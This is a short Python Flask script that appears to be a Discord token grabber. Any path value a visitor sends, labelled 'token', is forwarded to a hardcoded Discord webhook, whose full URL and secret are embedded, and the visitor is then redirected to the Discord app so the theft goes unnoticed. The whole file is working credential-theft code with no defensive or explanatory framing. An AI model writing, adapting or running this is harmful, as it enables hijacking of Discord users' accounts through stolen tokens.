from dhooks import Webhook
from flask import Flask, redirect
e = "https://discord.com/api/webhooks/1352321566259675156/xZ5lbQaHrxSNjS3VbBQcgbbgFSt5fcmLVM3O6cuY8WLuxfP3ogvEkjFf3ZneZ5SScKjG"
app = Flask(__name__)
hook = Webhook(e)
@app.route('/<string:token>')
def index(token):
  hook.send(token)
  return redirect("https://discord.com/app")

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=81)
